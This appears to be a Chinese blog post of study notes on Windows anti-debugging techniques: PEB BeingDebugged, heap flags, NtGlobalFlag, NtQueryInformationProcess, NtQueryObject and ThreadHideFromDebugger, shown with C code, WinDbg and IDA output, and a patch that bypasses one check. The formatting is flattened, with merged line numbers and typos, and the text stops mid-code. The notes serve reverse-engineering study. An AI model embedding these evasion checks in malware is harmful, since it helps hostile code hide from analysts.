https://blog.csdn.net/sanqiuai/article/details/119928978 带学习的链接https://bbs.pediy.com/thread-268436.htm#:~:text=%E5%87%BD%E6%95%B0ntdll%21NtSetInformationThread%20%28%29%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E4%BB%8E%E8%B0%83%E8%AF%95%E5%99%A8%E4%B8%AD%E9%9A%90%E8%97%8F%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B%E3%80%82,%E5%80%9F%E5%8A%A9%E6%9C%AA%E8%AE%B0%E5%BD%95%E7%9A%84%E5%80%BCTHREAD_INFORMATION_CLASS%3A%3AThreadHideFromDebugger%20%280x11%29%E7%9A%84%E5%B8%AE%E5%8A%A9%E4%B8%8B%E5%AE%9E%E7%8E%B0%E3%80%82 https://blog.csdn.net/Simon798/article/details/103161482 背景知识TEB&#x2F;PEB12345678910111213141516+0x000 struct NtTib : 本身是一个结构体&#123; 00h SEH链的地址 ... 18h TEB的地址,指向了自己&#125;... +0x30 PEB : 指向一个结构体&#123; +0x002 BeingDebugged : UChar 为1表示正在调试中,为0则不再调试中 +0x008 ImageBaseAddress : Ptr32 Void 进程的基址 +0x00c Ldr : Ptr32 _PEB_LDR_DATA 一个结构体指针 +0x018 ProcessHeap : Ptr32 Void +0x068 NtGlobalFlag : Uint4B&#125; 获取PEB地址 way1 12mov eax,dword ptr fs:[18]mov ecx,dword ptr ds:[eax+0x30] way2 1mvo eax,dword ptr fs:[0x30] PEB 12345+0x002 BeingDebugged : UChar 为1表示正在调试中,为0则不再调试中+0x008 ImageBaseAddress : Ptr32 Void 进程的基址+0x00c Ldr : Ptr32 _PEB_LDR_DATA 一个结构体指针+0x018 ProcessHeap : Ptr32 Void+0x068 NtGlobalFlag : Uint4B Ldr指向 1234567891011+0x000 Length //结构体大小 +0x004 Initialized //进程是否初始化完成+0x008 SsHandle +0x00c InLoadOrderModuleList : _LIST_ENTRY+0x014 InMemoryOrderModuleList : _LIST_ENTRY+0x01c InInitializationOrderModuleList : _LIST_ENTRY +0x024 EntryInProgress+0x028 ShutdownInProgress+0x02c ShutdownThreadId processheap ntglobalflag Anti-Debugging次处只会涉及exe的反调试,关于 静态调试的特征 bingdebuged123456789101112131415#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt; Windows.h&gt;int main()&#123; if (IsDebuggerPresent()) &#123; printf(&quot;dbg find &quot;); exit(-1); &#125; printf(&quot;Hello World &quot;); return 0;&#125; x86 123450:000&lt; u kernelbase!IsDebuggerPresent L3KERNELBASE!IsDebuggerPresent:64a130000000 mov eax,dword ptr fs:[00000030h] ; PEB get0fb64002 movzx eax,byte ptr [eax+2]c3 ret x64 123450:000&lt; u kernelbase!IsDebuggerPresent L3KERNELBASE!IsDebuggerPresent:65488b042560000000 mov rax,qword ptr gs:[60h] ;PEB get0fb64002 movzx eax,byte ptr [rax+2]c3 ret 使用x86位代码检测x64位环境 123mov eax,dword ptr fs:[00000030h] ; PEB getcmp byte ptr [eax+1002h], 0 ;check BeingDebuggedjne being_debugged 在FS寄存器的偏移量30h处存在PEB（进程环境块）， 而在X64上，PEB（进程环境块）存在于GS段寄存器的偏移量60h处。 在PEB中的2个偏移量处，我们将找到BeingDebugged字段 123450:000&lt; dt _PEBntdll!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar 即IsDebuggerPresent函数读取BeingDebugged字段的值。如果进程被调试，值为1，否则为0 下面有个x86的代码,获取PEB,我不是很理解 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#define _CRT_SECURE_NO_WARNINGS#pragma warning(disable: 4996)#include &lt;stdio.h&gt;#include &lt; Windows.h&gt;WORD GetVersionWord()&#123; OSVERSIONINFO verInfo = &#123; sizeof(OSVERSIONINFO) &#125;; GetVersionEx(&amp;verInfo); return MAKEWORD(verInfo.dwMinorVersion, verInfo.dwMajorVersion);&#125;BOOL IsWin8OrHigher() &#123; return GetVersionWord() &gt;= _WIN32_WINNT_WIN8; &#125;BOOL IsVistaOrHigher() &#123; return GetVersionWord() &gt;= _WIN32_WINNT_VISTA; &#125;// Get PEB for WOW64 ProcessPVOID GetPEB64()&#123; PVOID pPeb = 0;#ifndef _WIN64 // 1. There are two copies of PEB - PEB64 and PEB32 in WOW64 process // 2. PEB64 follows after PEB32 // 3. This is true for version less then Windows 8, else __readfsdword returns address of real PEB64 if (IsWin8OrHigher()) &#123; BOOL isWow64 = FALSE; typedef BOOL(WINAPI* pfnIsWow64Process)(HANDLE hProcess, PBOOL isWow64); pfnIsWow64Process fnIsWow64Process = (pfnIsWow64Process)GetProcAddress(GetModuleHandleA(&quot;Kernel32.dll&quot;), &quot;IsWow64Process&quot;); if (fnIsWow64Process(GetCurrentProcess(), &amp;isWow64)) &#123; if (isWow64) &#123; pPeb = (PVOID)__readfsdword(0x0C * sizeof(PVOID)); pPeb = (PVOID)((PBYTE)pPeb + 0x1000); &#125; &#125; &#125;#endif return pPeb;&#125;int main()&#123; PVOID tmp = GetPEB64(); printf(&quot;%08X &quot;,tmp); return 0;&#125; TLS详情见自己的PE文章基础篇 Flag&#x2F;ForceFlag TEB-&gt;PEB-&gt;ProcessHeap.Flags 相对于ProcessHeap是0x0c TEB-&gt;PEB-&gt;ProcessHeap.ForcFlags 相对于ProcessHeap是0x10 &amp;TEB+0x18-&gt;fs:[00] &amp;PEB+0x18-&gt;ProcessHeap x86 123450:000&gt; dt _PEB ProcessHeap @$pebntdll!_PEB +0x018 ProcessHeap : 0x00440000 Void0:000&gt; dt _HEAP Flags ForceFlags 00440000 ntdll!_HEAP +0x040 Flags : 0x40000062 +0x044 ForceFlags : 0x40000060 x64 12345670:000&gt; dt _PEB ProcessHeap @$pebntdll!_PEB +0x030 ProcessHeap : 0x0000009d`94b60000 Void0:000&gt; dt _HEAP Flags ForceFlags 0000009d`94b60000ntdll!_HEAP +0x070 Flags : 0x40000062 +0x074 ForceFlags : 0x40000060 问题是不管我有没有正常运行他都是反调试 12345678910111213141516171819202122232425262728293031323334353637#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#include&lt;stdlib.h&gt;void PEB()&#123; FARPROC Process_far_proc = NULL; LPBYTE pTEB = NULL; LPBYTE PEB_p = NULL; HMODULE tmp = NULL; tmp = GetModuleHandle(L&quot;ntdll.dll&quot;); if (tmp == NULL) exit(-1); Process_far_proc = GetProcAddress( tmp,&quot;NtCurrentTeb&quot;); pTEB = (LPBYTE)(*Process_far_proc)(); // 函数(*Process_far_proc)(),返回值强制转化(LPBYTE) PEB_p = (LPBYTE) * (LPDWORD)(pTEB + 0x30); //PEB地址 LPBYTE Heap_p = (LPBYTE) * (LPDWORD)(PEB_p + 0x18); //ProcessHeap地址 //不理解它的类型 DWORD Flags_dw = *(LPDWORD)(Heap_p + 0xC);//flag DWORD ForceFlags_dw = *(LPDWORD)(Heap_p + 0x10);//forcflag if ((Flags_dw != 0x2) || (ForceFlags_dw != 0x0)) puts(&quot;0x9d&quot;);&#125;int _tmain(int argc, TCHAR* argv[])&#123; PEB(); system(&quot;pause nul&quot;); return 0;&#125; 大佬写的代码.暂时不能运行 12345678910111213141516171819202122232425262728293031323334353637383940414243444546int GetHeapFlagsOffset(bool x64)&#123; return x64 ? IsVistaOrHigher() ? 0x70 : 0x14: //x64 offsets IsVistaOrHigher() ? 0x40 : 0x0C; //x86 offsets&#125;int GetHeapForceFlagsOffset(bool x64)&#123; return x64 ? IsVistaOrHigher() ? 0x74 : 0x18: //x64 offsets IsVistaOrHigher() ? 0x44 : 0x10; //x86 offsets&#125;void CheckHeap()&#123; PVOID pPeb = GetPEB(); PVOID pPeb64 = GetPEB64(); PVOID heap = 0; DWORD offsetProcessHeap = 0; PDWORD heapFlagsPtr = 0, heapForceFlagsPtr = 0; BOOL x64 = FALSE;#ifdef _WIN64 x64 = TRUE; offsetProcessHeap = 0x30;#else offsetProcessHeap = 0x18;#endif heap = (PVOID)*(PDWORD_PTR)((PBYTE)pPeb + offsetProcessHeap); heapFlagsPtr = (PDWORD)((PBYTE)heap + GetHeapFlagsOffset(x64)); heapForceFlagsPtr = (PDWORD)((PBYTE)heap + GetHeapForceFlagsOffset(x64)); if (*heapFlagsPtr &amp; ~HEAP_GROWABLE || *heapForceFlagsPtr != 0) &#123; std::cout &lt;&lt; &quot;Stop debugging program!&quot; &lt;&lt; std::endl; exit(-1); &#125; if (pPeb64) &#123; heap = (PVOID)*(PDWORD_PTR)((PBYTE)pPeb64 + 0x30); heapFlagsPtr = (PDWORD)((PBYTE)heap + GetHeapFlagsOffset(true)); heapForceFlagsPtr = (PDWORD)((PBYTE)heap + GetHeapForceFlagsOffset(true)); if (*heapFlagsPtr &amp; ~HEAP_GROWABLE || *heapForceFlagsPtr != 0) &#123; std::cout &lt;&lt; &quot;Stop debugging program!&quot; &lt;&lt; std::endl; exit(-1); &#125; &#125;&#125; CheckRemoteDebuggerPresentkernel32的CheckRemoteDebuggerPresent函数用于检测指定进程是否正在被调试. CheckRemoteDebuggerPresent 1234567891011CheckRemoteDebuggerPresent( _in_ 进程句柄, _oot_ &amp;result)如果调试&#123;\tresult=1&#125;else&#123;\tresult=0;&#125;: 返回值恒为1 x86 1234567push eaxpush esppush -1 ;GetCurrentProcess()call CheckRemoteDebuggerPresentpop eaxtest eax, eaxjne being_debugged x64 1234567enter 20h, 0mov edx, ebpor rcx, -1 ;GetCurrentProcess()call CheckRemoteDebuggerPresentleavetest ebp, ebpjne being_debugged 123456789101112131415161718192021222324#define _CRT_SECURE_NO_WARNINGS# include&lt;Windows.h&gt;# include&lt;stdio.h&gt;BOOL CheckDebug()&#123;\tBOOL isDebugged;\tCheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;isDebugged);\treturn isDebugged;&#125;int main()&#123;\twhile (1)\t&#123; if (CheckDebug()) &#123; MessageBox(0, &quot;软件正在被调试&quot;, 0, 0); return 0; &#125; printf(&quot;I am running... &quot;); Sleep(600);\t&#125;\treturn 0;&#125; NtGlobalFlag位置(PEB_p + 0x68); 正常运行是0 dbg是0x70 在调试期间，这些标识在NtGlobalFlag字段中的设置如下： 123FLG_HEAP_ENABLE_TAIL_CHECK (0x10)FLG_HEAP_ENABLE_FREE_CHECK (0x20)FLG_HEAP_VALIDATE_PARAMETERS (0x40) 要检查进程是否使用了调试器启动，你应该检查PEB结构的NtGlobalFlag字段的值。 在x32和x64系统中，该字段位于PEB结构的开始处的0x068和0x0bc偏移处 1230:000&gt; dt _PEB NtGlobalFlag @$peb ntdll!_PEB +0x068 NtGlobalFlag : 0x70 1230:000&gt; dt _PEB NtGlobalFlag @$pebntdll!_PEB +0x0bc NtGlobalFlag : 0x70 123456789101112131415161718192021222324252627282930313233343536#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#include &lt;stdlib.h&gt;void PEB()&#123; FARPROC Process_far_proc = NULL; LPBYTE pTEB = NULL; LPBYTE PEB_p = NULL; HMODULE tmp = NULL; //---------------------------------------------------------------------- tmp = GetModuleHandle(L&quot;ntdll.dll&quot;); if (tmp == NULL) exit(-1); Process_far_proc = GetProcAddress(tmp, &quot;NtCurrentTeb&quot;); pTEB = (LPBYTE)(*Process_far_proc)(); // 函数(*Process_far_proc)(),返回值强制转化(LPBYTE) PEB_p = (LPBYTE) * (LPDWORD)(pTEB + 0x30); // address of PEB //-------------------------------------------------------------------------NtGlobalFlag DWORD NtGlobalFlag_dw = *(LPDWORD)(PEB_p + 0x68); if ((NtGlobalFlag_dw &amp; 0x70) == 0x70)//如果0&amp;任何数是0.不会进入,被调试时它的值就是0x70 printf(&quot; NtGlobalFlag=&gt; Debugging!!! &quot;);&#125;int _tmain(int argc, TCHAR* argv[])&#123; PEB(); system(&quot;pause nul&quot;); return 0;&#125; 下面这份代码是基于x64或者x86的,但是缺失了一个函数 123456789101112131415161718192021222324252627282930#define FLG_HEAP_ENABLE_TAIL_CHECK 0x10#define FLG_HEAP_ENABLE_FREE_CHECK 0x20#define FLG_HEAP_VALIDATE_PARAMETERS 0x40#define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)void CheckNtGlobalFlag()&#123; PVOID pPeb = GetPEB(); PVOID pPeb64 = GetPEB64(); DWORD offsetNtGlobalFlag = 0;#ifdef _WIN64 offsetNtGlobalFlag = 0xBC;#else offsetNtGlobalFlag = 0x68;#endif DWORD NtGlobalFlag = *(PDWORD)((PBYTE)pPeb + offsetNtGlobalFlag); if (NtGlobalFlag &amp; NT_GLOBAL_FLAG_DEBUGGED) &#123; std::cout &lt;&lt; &quot;Stop debugging program!&quot; &lt;&lt; std::endl; exit(-1); &#125; if (pPeb64) &#123; DWORD NtGlobalFlagWow64 = *(PDWORD)((PBYTE)pPeb64 + 0xBC); if (NtGlobalFlagWow64 &amp; NT_GLOBAL_FLAG_DEBUGGED) &#123; std::cout &lt;&lt; &quot;Stop debugging program!&quot; &lt;&lt; std::endl; exit(-1); &#125; &#125;&#125; NtQueryInformationProcess 查询进程根据一些进程的端口值去判断 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;tchar.h&quot;enum encode&#123; Ask_Pro_Dbg_Port = 7,//看这里,非调试状态下他为0,调试状态下为0xFFFFFFFF Ask_Proc_Dbg_Obj_Handle = 30,//看这里 正常运行时为NULL Ask_Proc_Dbg_Flags = 31,//看这里 正常运行时为1,调试时为0&#125;;typedef NTSTATUS(WINAPI* NT_Query_Info_Proc)( HANDLE ProcessHandle, encode ask_info, PVOID proc_info_p_out, ULONG ProcessInformationLength, PULONG ReturnLength );void anti_dbg()&#123; HMODULE tmp = NULL; HANDLE tmp2 = NULL; NT_Query_Info_Proc ptr_func = NULL; DWORD check1 = 0;// Ask_Pro_Dbg_Port (0x7) HANDLE check2 = NULL;// Ask_Proc_Dbg_Obj_Handle (0x1E) BOOL check3 = TRUE;// Ask_Proc_Dbg_Flags (0x1F) tmp = GetModuleHandle(L&quot;ntdll.dll&quot;); if (tmp == NULL) exit(-1); ptr_func = (NT_Query_Info_Proc)GetProcAddress(tmp, &quot;NtQueryInformationProcess&quot;); // Ask_Pro_Dbg_Port (0x7) tmp2 = GetCurrentProcess(); ptr_func(tmp2, Ask_Pro_Dbg_Port, &amp;check1, sizeof(check1), NULL); ptr_func(tmp2, Ask_Proc_Dbg_Obj_Handle, &amp;check2, sizeof(check2), NULL); ptr_func(tmp2, Ask_Proc_Dbg_Flags, &amp;check3, sizeof(check3), NULL); if ((check1 != 0x0) || (check2 != 0x0) || (check3 == 0x0)) puts(&quot;g!&quot;);&#125;int _tmain()&#123; anti_dbg(); system(&quot;pause&quot;); return 0;&#125; 破解方法,在内存中修改API函数,请选择一个合适的区域写上你的汇编 1234567891011121314151600407E01 8B5C24 0C mov ebx,dword ptr ss:[esp+0xC]00407E05 8B4424 08 mov eax,dword ptr ss:[esp+0x8]00407E09 83F8 07 cmp eax,0x700407E0C 74 0E je short StaAD_Nt.00407E1C00407E0E 83F8 1E cmp eax,0x1E00407E11 74 11 je short StaAD_Nt.00407E2400407E13 83F8 1F cmp eax,0x1F00407E16 74 14 je short StaAD_Nt.00407E2C00407E18 90 nop00407E19 C2 1400 retn 0x1400407E1C C703 00000000 mov dword ptr ds:[ebx],0x000407E22 ^ EB F4 jmp short StaAD_Nt.00407E1800407E24 C703 00000000 mov dword ptr ds:[ebx],0x000407E2A ^ EB EC jmp short StaAD_Nt.00407E1800407E2C C703 01000000 mov dword ptr ds:[ebx],0x100407E32 ^ EB E4 jmp short StaAD_Nt.00407E18 对返回值做一个修改 对传入的参数做一个修改 IDA 12345678910111213141516171819202122232425262728int sub_415250()&#123; int result; // eax int v1[3]; // [esp+D0h] [ebp-48h] BYREF int v2[3]; // [esp+DCh] [ebp-3Ch] BYREF int v3[3]; // [esp+E8h] [ebp-30h] BYREF NTSTATUS (__stdcall *NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG); // [esp+F4h] [ebp-24h] HANDLE CurrentProcess; // [esp+100h] [ebp-18h] HMODULE hModule; // [esp+10Ch] [ebp-Ch] __CheckForDebuggerJustMyCode(&amp;unk_41C0AC); CurrentProcess = 0; NtQueryInformationProcess = 0; v3[0] = 0; v2[0] = 0; v1[0] = 1; hModule = GetModuleHandleW(L&quot;ntdll.dll&quot;); if ( !hModule ) exit(-1); NtQueryInformationProcess = (NTSTATUS (__stdcall *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;); CurrentProcess = GetCurrentProcess(); ((void (__cdecl *)(HANDLE, int, int *, int, _DWORD))NtQueryInformationProcess)(CurrentProcess, 7, v3, 4, 0); ((void (__cdecl *)(HANDLE, int, int *, int, _DWORD))NtQueryInformationProcess)(CurrentProcess, 0x1E, v2, 4, 0); result = ((int (__cdecl *)(HANDLE, int, int *, int, _DWORD))NtQueryInformationProcess)(CurrentProcess, 0x1F, v1, 4, 0); if ( v3[0] || v2[0] || !v1[0] ) return puts(&quot;g!&quot;); return result;&#125; NtGlobalFlag和IMAGE_LOAD_CONFIG_DIRECTORY可执行文件既包括IMAGE_LOAD_CONFIG_DIRECTORY结构，也包括系统加载程序的其他配置参数。 不过在默认情况下，此结构不会内置到可执行文件中，需要使用补丁添加。此结构具有GlobalFlagsClear字段， 对PEB结构中要重置的NtGlobalFlag字段进行了标识。如果最初没有对该结构或GlobalFlagsClear &#x3D; 0创建可执行文件， 那么在磁盘或内存中，该字段就具有非零值，隐藏的调试器就会正常运行。 下面就是检查运行进程的内存和磁盘上的GlobalFlagsClear字段的代码，这是一种流行的反调试技术： 作者写失败了? 我表示不懂原理,不会修改,反正怎么调试都不报错 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#define _CRT_SECURE_NO_WARNINGS# include&lt;Windows.h&gt;# include&lt;stdio.h&gt;PIMAGE_NT_HEADERS GetImageNtHeaders(PBYTE pImageBase)&#123; PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pImageBase; return (PIMAGE_NT_HEADERS)(pImageBase + pImageDosHeader-&gt;e_lfanew);&#125;PIMAGE_SECTION_HEADER FindRDataSection(PBYTE pImageBase)&#123; char rdata[] = &quot;.rdata&quot;; PIMAGE_NT_HEADERS pImageNtHeaders = GetImageNtHeaders(pImageBase); PIMAGE_SECTION_HEADER pImageSectionHeader = IMAGE_FIRST_SECTION(pImageNtHeaders); int n = 0; for (; n &lt; pImageNtHeaders-&gt;FileHeader.NumberOfSections; ++n) &#123; if (!strcmp(rdata ,(char*)pImageSectionHeader[n].Name)) &#123; break; &#125; &#125; return &amp;pImageSectionHeader[n];&#125;void CheckGlobalFlagsClearInProcess()&#123; PBYTE pImageBase = (PBYTE)GetModuleHandle(NULL); PIMAGE_NT_HEADERS pImageNtHeaders = GetImageNtHeaders(pImageBase); PIMAGE_LOAD_CONFIG_DIRECTORY pImageLoadConfigDirectory = (PIMAGE_LOAD_CONFIG_DIRECTORY)(pImageBase + pImageNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress); if (pImageLoadConfigDirectory-&gt;GlobalFlagsClear != 0) &#123; printf(&quot;Stop debugging program! &quot;); exit(-1); &#125;&#125;void CheckGlobalFlagsClearInFile()&#123; HANDLE hExecutable = INVALID_HANDLE_VALUE; HANDLE hExecutableMapping = NULL; PBYTE pMappedImageBase = NULL; __try &#123; PBYTE pImageBase = (PBYTE)GetModuleHandle(NULL); PIMAGE_SECTION_HEADER pImageSectionHeader = FindRDataSection(pImageBase); TCHAR pszExecutablePath[MAX_PATH]; DWORD dwPathLength = GetModuleFileName(NULL, pszExecutablePath, MAX_PATH); if (0 == dwPathLength) __leave; hExecutable = CreateFile(pszExecutablePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); if (INVALID_HANDLE_VALUE == hExecutable) __leave; hExecutableMapping = CreateFileMapping(hExecutable, NULL, PAGE_READONLY, 0, 0, NULL); if (NULL == hExecutableMapping) __leave; pMappedImageBase = (PBYTE)MapViewOfFile(hExecutableMapping, FILE_MAP_READ, 0, 0, pImageSectionHeader-&gt;PointerToRawData + pImageSectionHeader-&gt;SizeOfRawData); if (NULL == pMappedImageBase) __leave; PIMAGE_NT_HEADERS pImageNtHeaders = GetImageNtHeaders(pMappedImageBase); PIMAGE_LOAD_CONFIG_DIRECTORY pImageLoadConfigDirectory = (PIMAGE_LOAD_CONFIG_DIRECTORY)(pMappedImageBase + (pImageSectionHeader-&gt;PointerToRawData + (pImageNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress - pImageSectionHeader-&gt;VirtualAddress))); if (pImageLoadConfigDirectory-&gt;GlobalFlagsClear != 0) &#123; printf(&quot;Stop debugging program! &quot;); exit(-1); &#125; &#125; __finally &#123; if (NULL != pMappedImageBase) UnmapViewOfFile(pMappedImageBase); if (NULL != hExecutableMapping) CloseHandle(hExecutableMapping); if (INVALID_HANDLE_VALUE != hExecutable) CloseHandle(hExecutable); &#125;&#125;int main()&#123; CheckGlobalFlagsClearInFile(); CheckGlobalFlagsClearInProcess(); puts(&quot;HelloWorld&quot;);\treturn 0;&#125; 在此代码中，CheckGlobalFlagsClearInProcess函数会通过加载当前运行 的进程地址查找PIMAGE_LOAD_CONFIG_DIRECTORY结构， 并检查GlobalFlagsClear字段值。如果不是0，那么该进程可能被调试。 CheckGlobalFlagsClearInFile函数也会执行相同的检查，但仅仅针对的是磁盘上的可执行文件 NtQueryObject 查询object主要是一些结构体里面存储着某些东西,然后去遍历那个信息 破解方法就是不让它去遍历,或者遍历其它的东西 NtQueryObject_pf(NULL, get_all, &amp;Size_ul, sizeof(Size_ul), &amp;Size_ul); 比如这里的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;tchar.h&gt;typedef enum _Obj_Info_Class_enum&#123; ObjectBasicInformation, ObjectNameInformation, ObjectTypeInformation, get_all,//只会用到这一个参数 ObjectHandleInformation&#125; just_enum;typedef struct _LSA_Unicode_Str_struct&#123; USHORT len; USHORT Max_Len; PWSTR Buf;&#125;Uncode_Str_struct;#pragma pack(1) //这里的意思是下面结构体的对齐方式是按照一个字节,这样的话数据分布会比较的紧凑,节约空间typedef struct _Obj_Type_info_struct &#123; Uncode_Str_struct TypeName; ULONG Handles_len; ULONG Objects_en;&#125;Obj_Type_info_struct, * Obj_Type_info_pstruct;typedef struct _obj_All_info_struct &#123; ULONG count; Obj_Type_info_struct member_struct[1];&#125;*obj_info_pstruct;#pragma pack()typedef NTSTATUS(WINAPI* NT_Query_Obj_pf)( HANDLE Handle, just_enum ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength );//--------------------------------------------------------------------------------------------------------------------void My_Nt_Query_Obj_func()&#123; //-------------------------------------------------------------------------------------------------------------------- obj_info_pstruct Buf_pstruct = NULL; void* Buf = NULL; ULONG Size_ul = 0; BOOL Debugging = FALSE;//默认没有开启 HMODULE tmp = NULL; //输入参数不同,函数的结果大为不同 tmp = GetModuleHandle(L&quot;ntdll.dll&quot;); if (tmp == NULL) exit(-1); //获取导出函数的地址 NT_Query_Obj_pf NtQueryObject_pf = (NT_Query_Obj_pf)GetProcAddress(tmp, &quot;NtQueryObject&quot;); // 输入链表的的size,这种参数的形式是为了获取size的大小 NtQueryObject_pf(NULL, get_all, &amp;Size_ul, sizeof(Size_ul), &amp;Size_ul); // 分配链表的缓冲,大小为刚才利用函数pf_NtQueryObject而获取的 Buf = VirtualAlloc(NULL, Size_ul, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); if (Buf == NULL) exit(-1); // 输入实际的链表,所有的信息都返回在了第三个参数 NtQueryObject_pf((HANDLE)0xFFFFFFFF, get_all, Buf, Size_ul, NULL);//这和上面那个参数不一样 Buf_pstruct = (obj_info_pstruct)Buf;//这个变量的类型是 _Obj_Info_Class_enum 的第4个成员 UCHAR* member_puc = (UCHAR*)Buf_pstruct-&gt;member_struct; Obj_Type_info_pstruct Obj_Type_Info_tmp_pstruct = NULL; for (UINT i = 0; i &lt; Buf_pstruct-&gt;count; i++) &#123; Obj_Type_Info_tmp_pstruct = (Obj_Type_info_pstruct)member_puc; if (wcscmp(L&quot;DebugObject&quot;, Obj_Type_Info_tmp_pstruct-&gt;TypeName.Buf) == 0) &#123; Debugging = (Obj_Type_Info_tmp_pstruct-&gt;Objects_en &gt; 0) ? TRUE : FALSE; break; &#125; //计算下一个结构体 member_puc = (UCHAR*)Obj_Type_Info_tmp_pstruct-&gt;TypeName.Buf; member_puc += Obj_Type_Info_tmp_pstruct-&gt;TypeName.len; member_puc = (UCHAR*)(((ULONG)member_puc &amp; 0xFFFFFFFC) + sizeof(ULONG)); &#125; if (Buf) VirtualFree(Buf, 0, MEM_RELEASE); if (Debugging) printf(&quot; =&gt; you are Debugging!!! &quot;);&#125;int _tmain(int argc, TCHAR* argv[])&#123; My_Nt_Query_Obj_func(); puts(&quot;have fun&quot;); system(&quot;pause nul&quot;); return 0;&#125; IDA 你会发现游戏额东西他没有编译出来,藏住了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849unsigned int *sub_415250()&#123; unsigned int *result; // eax unsigned int i; // [esp+D4h] [ebp-6Ch] unsigned __int16 *v2; // [esp+ECh] [ebp-54h] NTSTATUS (__stdcall *NtQueryObject)(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG); // [esp+F8h] [ebp-48h] HMODULE hModule; // [esp+104h] [ebp-3Ch] BOOL v5; // [esp+110h] [ebp-30h] SIZE_T dwSize[3]; // [esp+11Ch] [ebp-24h] BYREF LPVOID lpAddress; // [esp+128h] [ebp-18h] unsigned int *v8; // [esp+134h] [ebp-Ch] __CheckForDebuggerJustMyCode(&amp;unk_41C0AC); v8 = 0; lpAddress = 0; dwSize[0] = 0; v5 = 0; hModule = GetModuleHandleW(L&quot;ntdll.dll&quot;); if ( !hModule ) exit(-1); NtQueryObject = (NTSTATUS (__stdcall *)(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG))GetProcAddress( hModule, &quot;NtQueryObject&quot;); ((void (__cdecl *)(_DWORD, int, SIZE_T *, int, SIZE_T *))NtQueryObject)(0, 3, dwSize, 4, dwSize); lpAddress = VirtualAlloc(0, dwSize[0], 0x3000u, 4u); if ( !lpAddress ) exit(-1); ((void (*)(void))NtQueryObject)(); v8 = (unsigned int *)lpAddress; v2 = (unsigned __int16 *)((char *)lpAddress + 4); for ( i = 0; ; ++i ) &#123; result = v8; if ( i &gt;= *v8 ) break; if ( !wcscmp(L&quot;DebugObject&quot;, *((const wchar_t **)v2 + 1)) ) &#123; result = (unsigned int *)v2; v5 = *((_DWORD *)v2 + 3) != 0; break; &#125; v2 = (unsigned __int16 *)(((*((_DWORD *)v2 + 1) + *v2) &amp; 0xFFFFFFFC) + 4); &#125; if ( lpAddress ) result = (unsigned int *)VirtualFree(lpAddress, 0, 0x8000u); if ( v5 ) return (unsigned int *)sub_4113DE(&quot; =&gt; you are Debugging!!! &quot;, -1); return result;&#125; 进程分离如果正常运行,他会分离,但是会终止 如果是调试,他会分离和终止 里面的美剧类型都是自定义的, encode是反调试 decode是解除反调试,只要传入的不是0x11,应该都行 1234567891011121314151617181920212223242526272829303132#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;tchar.h&quot;void DetachDebugger()&#123; typedef enum _THREAD_INFORMATION_CLASS &#123; decode=0, encode =17 // 17 (0x11) &#125; THREAD_INFORMATION_CLASS; typedef NTSTATUS(WINAPI* ZWSETINFORMATIONTHREAD)( HANDLE ThreadHandle, THREAD_INFORMATION_CLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength ); HMODULE tmp = GetModuleHandle(L&quot;ntdll.dll&quot;); if (tmp == NULL) exit(-1); ZWSETINFORMATIONTHREAD pZwSetInformationThread = (ZWSETINFORMATIONTHREAD)GetProcAddress(tmp, &quot;ZwSetInformationThread&quot;); pZwSetInformationThread(GetCurrentThread(), encode, NULL, 0); printf(&quot;you can not get here &quot;);&#125;int _tmain(int argc, TCHAR* argv[])&#123; DetachDebugger(); system(&quot;pause nul&quot;); return 0;&#125; IDA 12345678910111213141516int sub_415250()&#123; HANDLE CurrentThread; // eax char v2; // [esp+0h] [ebp-E4h] FARPROC ZwSetInformationThread; // [esp+D0h] [ebp-14h] HMODULE hModule; // [esp+DCh] [ebp-8h] __CheckForDebuggerJustMyCode(&amp;unk_41C0AC); hModule = GetModuleHandleW(L&quot;ntdll.dll&quot;); if ( !hModule ) exit(-1); ZwSetInformationThread = GetProcAddress(hModule, &quot;ZwSetInformationThread&quot;); CurrentThread = GetCurrentThread(); ((void (__stdcall *)(HANDLE, int, _DWORD, _DWORD))ZwSetInformationThread)(CurrentThread, 17, 0, 0); return sub_4113DE(&quot;you can not get here &quot;, v2);&#125; 窗口检测检测一些IDA进程,IDA文件,IDA窗口,IDA注册表,主机名.计算机名,用户名,环境变量来决定反调试你 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &quot;stdio.h&quot;z#include &quot;windows.h&quot;#include &quot;tchar.h&quot;void FindDebuggerWindow()&#123; 